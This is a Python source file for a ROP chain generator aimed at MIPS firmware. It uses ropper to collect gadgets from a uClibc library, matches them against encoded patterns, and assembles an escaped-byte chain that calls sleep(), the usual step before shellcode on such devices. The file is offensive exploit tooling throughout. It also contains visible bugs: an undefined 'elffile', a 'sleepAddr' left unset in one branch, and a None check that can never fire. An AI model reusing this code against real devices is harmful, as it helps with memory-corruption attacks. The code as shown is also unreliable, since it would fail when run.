#!/usr/bin/python3

import sys
sys.path.append("..")
sys.path.append("filebytes")
from filebytes.elf import *
import ropper
import os
import time
import re
import base64
import yaml

class ROP_Maker():
	def __init__(self, **kwargs):
		self.binaryFilePath = kwargs['binaryFilePath']
		#array ['uclibc-9.0.3.so', ... ]
		self.libFilePath = kwargs['libFilePath']
		self.binaryBaseAddr = kwargs['binaryBaseAddr']
		self.libraryBaseAddr = kwargs['libraryBaseAddr']
		#default arch:mips 32 big endian
		self.arch = kwargs['arch']

	@staticmethod
	def encodeAddress(address,arch):
	#address: 0x12345678
	#return: \x12\x34\x56\x78
		encodeAddr = ''
		if arch == 'big':
			for c in range(2,10,2):
				encodeAddr += r'\x'+ address[c:c+2]
		else:
			for c in range(8,0,-2):
				encodeAddr += r'\x'+ address[c:c+2]
		return encodeAddr
		

	def saveGadgetsFile(self):	
		print('\033[1;;34m[INFO]\033[0m Find Gadgets in '+self.libFilePath)
		argv = ['--file', self.libFilePath, '-I', str(hex(self.libraryBaseAddr)), '--inst-count', '7', '--nocolor', '--all']
		#os.system('python3 Ropper.py --file ' + self.libFilePath + ' -I ' + str(hex(self.libraryBaseAddr)) + ' --inst-count 7 --nocolor --all > results/ROP_gadgets/gadgets')
		ropper.start(argv)
		print('\033[1;;34m[INFO]\033[0m Save gadgets finished in results/ROP_gadgets')

	def getPatternFile(self, filenum = 1):
		patternFile = open('databases/ROP_patterns/pattern'+str(filenum)+'.yaml','r')
		pattern = yaml.safe_load(patternFile)
		print('\033[1;;35m[LOAD]\033[0m Load pattern file 1.')
		return pattern

	def matchRopPattern(self):
		pattern = self.getPatternFile(filenum=1)
		gadgetFile = open('results/ROP_gadgets/gadgets','r')
		MatchResults = {}
		for key in pattern.keys():
			MatchResults[key] = []

		print('\033[1;;34m[INFO]\033[0m Use ROP chain pattern: ' + pattern['chainString'])
		print('\033[1;;34m[INFO]\033[0m Gadget matching with pattern..')
		print('\033[1;;34m[INFO]\033[0m Use base address '+str(hex(self.libraryBaseAddr))+',default is 0x2aae2000')
		
		for line in gadgetFile.readlines():
			for key in pattern.keys():
				if key == 'chainString':
					continue
				#print('\033[1;;34m[INFO]\033[0m '+key+' matching...')
				
				key_b64de = base64.b64decode(pattern[key]).decode('utf-8')
				match = re.match(r''+key_b64de, line)
				if match:
					#print('\033[1;;34m[INFO]\033[0m Find '+key+' match in address '+line[:10])
					MatchResults[key].append(line[:10])
					#print(MatchResults[key])
		if MatchResults == None:				
			print('\033[1;;34m[INFO]\033[0m No gadget found.')
			return None

		print('\033[1;;34m[INFO]\033[0m Find gadgets match in address:(max num printed=12)')
		for key in MatchResults.keys():
			if key == 'chainString':
				continue
			print('       ['+key+']:')
			if len(MatchResults[key]) > 12:
				matchlen = 12
			else:
				matchlen = len(MatchResults[key])

			for addr in range(0,matchlen):
				if addr>0 and addr%4 == 0:
					print()
				print('\t'+MatchResults[key][addr], end='')
			print()
		#print()
		MatchResults['chainString'] = pattern['chainString']
		return MatchResults

	def getSleepAddress(self):
		libcFile = ELF(self.libFilePath)
		if libcFile.sections:
			got = [s for s in elffile.sections if s.name=='.got'][0]
			print('\033[1;;34m[INFO]\033[0m Get GOT Name: %s' % got.name)
			print('\033[1;;34m[INFO]\033[0m Get GOT Offset: 0x%x' % got.header.sh_offset)
			print('\033[1;;34m[INFO]\033[0m Get GOT Address: 0x%x' % got.header.sh_addr)
			print('\033[1;;34m[INFO]\033[0m Get GOT Size: 0x%x' % got.header.sh_size)
		else:
			#use default sleep address
			sleepOffset = 0x53ca0
			sleepAddr = str(hex(sleepOffset + self.libraryBaseAddr))
			print('\033[1;;34m[INFO]\033[0m Cannot get sleep address,use default: '+sleepAddr)
		return self.encodeAddress(sleepAddr,self.arch)	

	def getRopChain(self):
		self.saveGadgetsFile()
		MatchResults = self.matchRopPattern()
		if MatchResults == None:
			return '[GADGETS]'
		sleepAddr = self.getSleepAddress()
		arch = self.arch

		print('\033[1;;34m[INFO]\033[0m Generating gadgets in MIPS '+arch+' endian')
		ropchain = MatchResults['chainString']
		for key in MatchResults.keys():
			encodeAddr = self.encodeAddress(MatchResults[key][0], arch)
			ropchain = ropchain.replace('('+key+')', encodeAddr)
		
		ropchain = ropchain.replace('(sleep)', sleepAddr)

		return ropchain
